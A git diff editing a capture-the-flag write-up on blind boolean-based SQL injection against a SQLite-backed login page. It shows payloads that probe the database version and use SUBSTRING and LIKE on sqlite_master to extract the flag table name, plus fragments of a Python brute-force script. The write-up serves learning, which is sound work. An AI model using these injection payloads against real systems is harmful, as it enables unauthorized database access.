@@ -1,53 +1,47 @@
 # B!inded! (Web Challenge)
-### First it is my first time to write writeups so it will be nice if you have a negative feedback for me :)
+### First, it is my first time writing writeups so it will be nice if you have negative feedback for me :)
 ## Description 
 
 ```
-No fuzzing is needed, just get the flag , Format : EGCERT{flag}
+No fuzzing is needed, just get the flag, Format: EGCERT{flag}
 Points : 200
 ```
 
 ## Enumeration 
  
-once i opened the challenge i found this login page 
+once I opened the challenge I found this login page
 
 ![loginpage](../assets/ieee/B!inded!/login-page.jpeg)
 
-And we have a hint on the description that tell us we don't need to fuzzing so our entry is the login page 
-so i tried ```admin``` ```admin``` in the user and pass , i have got response ```wrong password``` so now i know that we have admin username . 
+And we have a hint in the description that tells us we don’t need to fuzz so our entry is the login page 
+so i tried ```admin``` ```admin``` in the user and pass , but i got a response ```wrong password``` so now i know that we have admin username . 
 
-i tried again with aboelnour and pass and i have got that user not found
+i tried again with ```aboelnour``` and ```pass``` and i got a response ```user not found```
 
-so i fired up my burp and send ```a``` in user and ```a``` in pass
+so i fired up my burp and send ```a``` in username and ```a``` in password
 
-And i have noticed that username and password converted to hex and sperated by four zeros 
+And I have noticed that username and password are converted to hex and separated by four zeros 
 for example a = 61 in hex so our request will be like this 
 
 ![request](../assets/ieee/B!inded!/request.png)
 
-and the response of this request is
 
-```
-user not found 
-```
+From the challenge name, I got that it might be blind sqli 
 
-
-And from the challenge name i got that it might be blind sqli 
-
-so i typed ```aboelnour"``` in username and ```0``` in pass , i have got internal server error.
-then i typed ```aboelnour" or 1=1 -- -``` and B00M i have got response ```Wrong Password```  , to make sure i tried ```aboelnour" or 1=0 -- -``` and got response ```User not found``` , so it is boolean based sqli 
+so I typed ```aboelnour"``` in username and ```0``` in password , i have got an internal server error.
+then I typed ```aboelnour" or 1=1 -- -``` and B00M I have got response ```Wrong Password```  , to make sure I tried ```aboelnour" or 1=0 -- -``` and got response ```User not found``` , so it is boolean based sqli 
 
 so let's enum our sql type 
 
-i tried ```admin" select version()-- -``` but i got internal server error 
+I tried ```admin" select version()-- -``` , but I got an internal server error 
 
-so i tried ```admin"select sqlite_version()-- -``` , and response was Wrong password , so our db is ```SQLite``` 
+so I tried ```admin"select sqlite_version()-- -``` , and the response was ```Wrong password``` , so our db is ```SQLite``` 
 
 -----
 
 ## Extract table name  
 
-+ First of all , we have SQL Server SUBSTRING() Function , this function use to extracts some characters from a     string. 
++ First of all, we have SQL Server SUBSTRING() function , this function used to extract some characters from a string. 
 
 ### Ex :
 
@@ -57,26 +51,25 @@ so i tried ```admin"select sqlite_version()-- -``` , and response was Wrong pass
 
 and so on
 
-+ we have alos SQL LIKE Operator : you can check it on "[https://www.w3schools.com/sql/sql_like.asp](https://www.w3schools.com/sql/sql_like.asp)"
++ we have also SQL LIKE Operator : you can check it on "[https://www.w3schools.com/sql/sql_like.asp](https://www.w3schools.com/sql/sql_like.asp)"
 
 
-
-so if we have table name = users and column name = user we can enum users with query like this 
+So, if we have table_name = users and column_name = user, we'd enum users with a query like the below : 
 
 ```substring((select user from users where user like '%a%'),1,1) = 'a'```
 
 operator ```like '%a%``` : will finds any values that have a on any position  
 
-then i have searched about how to extract tables from SQLitedb and found this payloads in payloadsALLTheThings on github : [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version)
+then I searched about how to extract tables from SQLitedb and found these payloads in payloadsALLTheThings on GitHub : [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version)
 
 
-I got this query to Extract table names
+And I have got this query to Extract table names :
 
 ```
 SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 ```
 
-I have modified it to this query below to find any table have fl in any position  
+I have modified it to this query below to find any table have fl string in any position at values :
 
 ```
 SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_% AND like '%fl%'
@@ -86,20 +79,20 @@ so our final payload will be :
 
 ```admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like '%fl%'),1,1) = 'f' -- -```
 
-i tried it and i have got User not found so the first char not f 
+I tried it and I have got User not found so the first char not f 
 
-So i have tried
+So I have tried
 
 ```admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like '%fl%'),1,1) = 'F' -- -``` , i have got Wrong password so the first character is F 
 
-but it will be hard to make it manually so i have wrote python script to got table name 
+but it will be hard to make it manually so I have written a python script to enum table name  
 
 ----
 
 ## Exploit code 
 
-first we need to convert our username to hex and concate it with 000061 , 61 is the password
-second we need to brute force chars in i place then check if Wrong in response so we got the right char and increase step with 1 to find the second char and so on 
+First, we need to convert our username to hex and concatenate it with 000061 , 61 is the password
+Second, we need to bruteforce all chars with check if "Wrong" in response text that is meaning we got the right character and increase step with 1 to find the second char and so on 
 
 
 ```python
@@ -127,12 +120,12 @@ for j in range(1,len(string.printable)):
 print("Flag table name : " , table)
 ```
 
-Afer running this script i got 
+Afer running this script i have got table name 
 ```
 Flag table name : Flag_jnk249
 ```
 
-so now we have the table name 
+So now we have the table name 
 
 before brute force column i have try this payload 
 
@@ -141,7 +134,7 @@ admin"select flag from Flag_jnk249-- -
 ```
 and i got Wrong password so our column name is flag 
 
-i modified my previse script to got the flag 
+I modified my previse script to get the flag 
 
 
 ```python
